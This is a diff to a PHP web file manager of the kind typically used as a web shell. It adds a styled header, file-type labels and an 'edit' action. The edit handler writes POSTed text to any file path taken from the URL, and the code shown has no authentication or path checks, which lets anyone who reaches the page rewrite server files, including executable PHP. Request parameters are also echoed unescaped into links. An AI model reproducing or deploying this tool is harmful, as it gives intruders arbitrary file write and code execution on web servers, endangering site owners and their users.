@@ -1,3 +1,4 @@
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css2?family=Yantramanav:wght@300&display=swap');
 	* {
@@ -28,8 +29,55 @@
 		padding-bottom: 20px;
 		padding-right: 20px;
 	}
-	.isi .files a {
-		background: red;
+	.isi .header {
+		position: relative;
+		padding-top:10px;
+		padding-bottom:10px;
+	}
+	.isi .header .back {
+		position: absolute;
+		margin-top:6px;
+		padding-left:10px;
+		display: inline-block;
+		padding-bottom:15px;
+	}
+	.isi .header .back a {
+		padding-right:15px;
+		padding-left:15px;
+		padding-top:12px;
+		padding-bottom: 10px;
+		border-radius:50%;
+		background: #ebebeb;
+		color: #bdbdbd;
+	}
+	.isi .header .dirname {
+		width:88%;
+		margin-left:60px;
+		display: inline-block;
+		padding-left:15px;
+		font-size:25px;
+		overflow-x: hidden;
+        white-space: nowrap;
+        text-overflow: ellipsis;
+	}
+	.isi .header .menu {
+		margin-left:15px;
+		margin-top:-3px;
+		position: absolute;
+		display: inline-block;
+		padding-right:10px;
+		float: right;
+	}
+	.isi .header .menu button {
+		padding-right:15px;
+		padding-left:15px;
+		padding-top:15px;
+		padding-bottom: 12px;
+		border-radius:50%;
+		background: #ebebeb;
+		color: #bdbdbd;
+		outline: none;
+		border: none;
 	}
 	.isi .files .dir {
 		display: block;
@@ -59,6 +107,11 @@
 	}
 	.isi .files .dir .info {
 		font-size: 80%;
+	}
+	.isi .files .dir .type {
+		display: inline-block;
+		color: #666;
+		width:110px;
 	}
 	.isi .files .dir .size {
 		display: inline-block;
@@ -107,6 +160,11 @@
 	.isi .files .file .info {
 		font-size: 80%;
 	}
+	.isi .files .file .type {
+		display: inline-block;
+		color: #666;
+		width:110px;
+	}
 	.isi .files .file .sizes {
 		display: inline-block;
 		color: #666;
@@ -126,6 +184,42 @@
 		width:130px;
 		color: #666;
 	}
+	.edit {
+		padding:10px;
+	}
+	.edit .filename,
+	.edit .sizefile,
+	.edit .lastupdatefile,
+	.edit .ownerfile {
+		margin-bottom:10px;
+		margin-left:3px;
+	}
+	.edit .isifile {
+		margin-bottom:10px;
+	}
+	.edit .isifile textarea {
+		width:100%;
+		border-radius:15px;
+		resize: none;
+		border: 1px solid #ebebeb;
+		background: #ebebeb;
+		padding: 20px;
+		outline: none;
+		height:400px;
+	}
+	.submit input[type=submit] {
+		width:100%;
+		border: 1px solid #ebebeb;
+		background: #ebebeb;
+		padding:10px;
+		outline: none;
+		border-radius:15px;
+		font-weight:bold;
+		font-size:20px;
+	}
+	.submit input[type=submit]:hover {
+		cursor: pointer;
+	}
 </style>
 <body>
 	<?php
@@ -144,6 +238,7 @@
 			$file['names'] = basename($file['name']);
 			$file['ftime'] = ftime($file['name']);
 			$file['owner'] = owner($file['name']);
+			$file['type']  = (is_dir($file['name'])) ? filetype($file['name']) : "file " . strtoupper(getext($file['name']));
 			$file['size']  = (is_dir($file['name'])) ? countDir($file['name']). " items" : size($file['name']);
 			$array[] = $file;
 		} return $array;
@@ -248,132 +343,95 @@
     }
     function geticon($filename) {
         switch (getext($filename)) {
-            case 'php1':
-            case 'php2':
-            case 'php3':
-            case 'php4':
-            case 'php5':
-            case 'php6':
-            case 'phtml':
-            case 'php':
-                print('https://image.flaticon.com/icons/svg/2306/2306154.svg');
-                break;
-            case 'html':
-            case 'htm':
-                print('https://image.flaticon.com/icons/svg/2306/2306098.svg');
-                break;
-            case 'asp':
-            case 'aspx':
-                print('https://image.flaticon.com/icons/svg/2306/2306019.svg');
-                break;
-            case 'css':
-                print('https://image.flaticon.com/icons/svg/2306/2306041.svg');
-                break;
-            case 'js':
-                print('https://image.flaticon.com/icons/svg/2306/2306122.svg');
-                break;
-            case 'json':
-                print('https://image.flaticon.com/icons/svg/136/136525.svg');
-                break;
-            case 'xml':
-                print('https://image.flaticon.com/icons/svg/2306/2306209.svg');
-                break;
-            case 'py':
-                print('https://image.flaticon.com/icons/svg/617/617531.svg');
-                break;
-            case 'zip':
-                print('https://image.flaticon.com/icons/svg/2306/2306214.svg');
-                break;
-            case 'rar':
-                print('https://image.flaticon.com/icons/svg/2306/2306170.svg');
-                break;
-            case 'htaccess':
-                print('https://image.flaticon.com/icons/png/128/1720/1720444.png');
-                break;
-            case 'txt':
-                print('https://image.flaticon.com/icons/svg/2306/2306185.svg');
-                break;
-            case 'ini':
-                print('https://image.flaticon.com/icons/svg/1126/1126890.svg');
-                break;
-            case 'mp3':
-            case 'm4a':
-            case 'wav':
-            case 'ogg':
-                print('https://image.flaticon.com/icons/svg/2822/2822588.svg');
-                break;
-            case 'mp4':
-                print('https://image.flaticon.com/icons/svg/2822/2822589.svg');
-                break;
-            case 'log':
-                print('https://image.flaticon.com/icons/svg/2306/2306124.svg');
-                break;
-            case 'dat':
-                print('https://image.flaticon.com/icons/svg/2306/2306050.svg');
-                break;
-            case 'exe':
-                print('https://image.flaticon.com/icons/svg/2306/2306085.svg');
-                break;
-            case 'psd':
-                print("https://image.flaticon.com/icons/svg/2306/2306166.svg");
-                break;
-            case 'apk':
-                print('https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg');
-                break;
-            case 'yaml':
-                print('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');
-                break;
-            case 'md':
-                print("https://image.flaticon.com/icons/svg/2521/2521594.svg");
-                break;
-            case 'sql':
-                print("https://image.flaticon.com/icons/svg/2306/2306173.svg");
-                break;
-            case 'csv':
-                print("https://image.flaticon.com/icons/svg/2306/2306046.svg");
-                break;
-            case 'xls':
-                print("https://image.flaticon.com/icons/svg/2306/2306196.svg");
-                break;
-            case 'docs':
-                print("https://image.flaticon.com/icons/svg/2306/2306060.svg");
-                break;
-            case 'bak':
-                print('https://image.flaticon.com/icons/svg/2125/2125736.svg');
-                break;
-            case 'ico':
-                print('https://image.flaticon.com/icons/svg/1126/1126873.svg');
-                break;
-            case 'png':
-                print('https://image.flaticon.com/icons/svg/2306/2306156.svg');
-                break;
-            case 'jpg':
-            case 'jpeg':
-            case 'webp':
-                print('https://image.flaticon.com/icons/svg/2306/2306117.svg');
-                break;
-            case 'svg':
-                print('https://image.flaticon.com/icons/svg/2306/2306179.svg');
-                break;
-            case 'gif':
-                print('https://image.flaticon.com/icons/svg/2306/2306094.svg');
-                break;
-            case 'pdf':
-                print('https://image.flaticon.com/icons/svg/2306/2306145.svg');
-                break;
-            default:
-                print('https://image.flaticon.com/icons/svg/833/833524.svg');
-                break;
+            case 'php1':case 'php2':case 'php3':case 'php4':case 'php5':case 'php6':case 'phtml':case 'php':print('https://image.flaticon.com/icons/svg/2306/2306154.svg');break;
+            case 'html':case 'htm':print('https://image.flaticon.com/icons/svg/2306/2306098.svg');break;
+            case 'asp':case 'aspx':print('https://image.flaticon.com/icons/svg/2306/2306019.svg');break;
+            case 'css':print('https://image.flaticon.com/icons/svg/2306/2306041.svg');break;
+			case 'js':print('https://image.flaticon.com/icons/svg/2306/2306122.svg');break;
+            case 'json':print('https://image.flaticon.com/icons/svg/136/136525.svg');break;
+            case 'xml':print('https://image.flaticon.com/icons/svg/2306/2306209.svg');break;
+            case 'py':print('https://image.flaticon.com/icons/svg/617/617531.svg');break;
+            case 'zip':print('https://image.flaticon.com/icons/svg/2306/2306214.svg');break;
+            case 'rar':print('https://image.flaticon.com/icons/svg/2306/2306170.svg');break;
+            case 'htaccess':print('https://image.flaticon.com/icons/png/128/1720/1720444.png');break;
+            case 'txt':print('https://image.flaticon.com/icons/svg/2306/2306185.svg');break;
+            case 'ini':print('https://image.flaticon.com/icons/svg/1126/1126890.svg');break;
+            case 'mp3':case 'm4a':case 'wav':case 'ogg':print('https://image.flaticon.com/icons/svg/2822/2822588.svg');break;
+            case 'mp4':print('https://image.flaticon.com/icons/svg/2822/2822589.svg');break;
+            case 'log':print('https://image.flaticon.com/icons/svg/2306/2306124.svg');break;
+            case 'dat':print('https://image.flaticon.com/icons/svg/2306/2306050.svg');break;
+            case 'exe':print('https://image.flaticon.com/icons/svg/2306/2306085.svg');break;
+            case 'psd':print("https://image.flaticon.com/icons/svg/2306/2306166.svg");break;
+            case 'apk':print('https://1.bp.blogspot.com/-HZGGTdD2niI/U2KlyCpOVnI/AAAAAAAABzI/bavDJBFSo-Q/s1600/apk-icon.jpg');break;
+            case 'yaml':print('https://cdn1.iconfinder.com/data/icons/hawcons/32/698694-icon-103-document-file-yml-512.png');break;
+            case 'md':print("https://image.flaticon.com/icons/svg/2521/2521594.svg");break;
+            case 'sql':print("https://image.flaticon.com/icons/svg/2306/2306173.svg");break;
+            case 'csv':print("https://image.flaticon.com/icons/svg/2306/2306046.svg");break;
+            case 'xls':print("https://image.flaticon.com/icons/svg/2306/2306196.svg");break;
+            case 'docs':print("https://image.flaticon.com/icons/svg/2306/2306060.svg");break;
+            case 'bak':print('https://image.flaticon.com/icons/svg/2125/2125736.svg');break;
+            case 'ico':print('https://image.flaticon.com/icons/svg/1126/1126873.svg');break;
+            case 'png':print('https://image.flaticon.com/icons/svg/2306/2306156.svg');break;
+            case 'jpg':case 'jpeg':case 'webp':print('https://image.flaticon.com/icons/svg/2306/2306117.svg');break;
+            case 'svg':print('https://image.flaticon.com/icons/svg/2306/2306179.svg');break;
+            case 'gif':print('https://image.flaticon.com/icons/svg/2306/2306094.svg');break;
+            case 'pdf':print('https://image.flaticon.com/icons/svg/2306/2306145.svg');break;
+            default:print('https://image.flaticon.com/icons/svg/833/833524.svg');break;
         }
     }
-
-	if (isset($_GET['cd'])) {
-		cd($_GET['cd']);
-	}
+	if (isset($_GET['cd'])){cd($_GET['cd']);}
 	?>
 	<div class="isi">
 		<div class="files">
+			<div class="header">
+				<div class="back">
+					<a href="?cd=<?= dirname(getcwd()) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>
+				</div>
+				<div class="dirname">
+					<?= basename(getcwd()) ?>
+				</div>
+				<div class="menu">
+					<button><i class="fa fa-bars" aria-hidden="true"></i></button>
+				</div>
+			</div>
 			<?php
+			switch (@$_GET['action']) {
+				case 'edit':
+				if (isset($_POST['submit'])) {
+					$handle = fopen($_GET['file'], "w");
+					if (fwrite($handle, $_POST['data'])) {
+						print("success");
+					} else {
+						print("failed");
+					}
+				}
+					?>
+					<div class="edit">
+						<div class="filename">
+							Filename : <?= wr($_GET['file'], basename($_GET['file']), 2) ?>
+						</div>
+						<div class="sizefile">
+							Size : <?= size($_GET['file']) ?>
+						</div>
+						<div class="lastupdatefile">
+							Last Update : <?= ftime($_GET['file']) ?>
+						</div>
+						<div class="ownerfile">
+							Owner : <?= owner($_GET['file']) ?>
+						</div>
+						<form method="post">
+							<div class="isifile">
+								<textarea name="data"><?= htmlspecialchars(file_get_contents($_GET['file'])) ?></textarea>
+							</div>
+							<div class="submit">
+								<input type="submit" name="submit" value="SAVE">
+							</div>
+						</form>
+					</div>
+					<?php
+					exit();
+					break;
+			}
 			foreach (files('dir') as $key => $dir) { ?>
 				<a href="?cd=<?= $dir['name'] ?>">
 					<div class="dir">
@@ -385,6 +443,9 @@
 								<?= $dir['names'] ?>
 							</div>
 							<div class="info">
+								<div class="type">
+									<?=  $dir['type'] ?>
+								</div>
 								<div class="size">
 									<?= $dir['size'] ?>
 								</div>
@@ -404,28 +465,33 @@
 			<?php }
 			foreach (files('file') as $key => $file) { ?>
 				<div class="file">
-					<div class="icons">
-						<img src="<?= geticon($file['name']) ?>">
-					</div>
-					<div class="names">
-						<div class="filename">
-							<?= $file['names'] ?>
+					<a href="?cd=<?= getcwd() ?>&action=edit&file=<?= $file['name'] ?>">
+						<div class="icons">
+							<img src="<?= geticon($file['name']) ?>">
 						</div>
-						<div class="info">
-							<div class="sizes">
-								<?= $file['size'] ?>
+						<div class="names">
+							<div class="filename">
+								<?= $file['names'] ?>
 							</div>
-							<div class="perms">
-								<?= wr($file['name'], perms($file['name']), 2) ?>
-							</div>
-							<div class="lastupdate">
-								<?= $file['ftime'] ?>
-							</div>
-							<div class="owner">
-								<?= $file['owner'] ?>
+							<div class="info">
+								<div class="type">
+									<?= $file['type'] ?>
+								</div>
+								<div class="sizes">
+									<?= $file['size'] ?>
+								</div>
+								<div class="perms">
+									<?= wr($file['name'], perms($file['name']), 2) ?>
+								</div>
+								<div class="lastupdate">
+									<?= $file['ftime'] ?>
+								</div>
+								<div class="owner">
+									<?= $file['owner'] ?>
+								</div>
 							</div>
 						</div>
-					</div>
+					</a>
 				</div>
 			<?php }
 			?>
